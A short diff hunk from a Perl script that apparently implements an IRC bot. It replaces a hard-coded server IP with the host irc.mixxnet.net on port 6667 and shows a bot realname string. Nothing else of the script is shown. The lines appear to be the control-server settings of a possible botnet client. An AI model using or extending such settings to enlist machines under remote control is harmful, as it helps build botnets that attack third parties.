@@ -130,7 +130,7 @@ chop (my $realname = '[Protection]-');
 
 #IRC name and Realname  
 
-$servidor='178.33.38.42' unless $servidor; 
+$servidor='irc.mixxnet.net' unless $servidor; 
 
 my $porta='6667';  
 
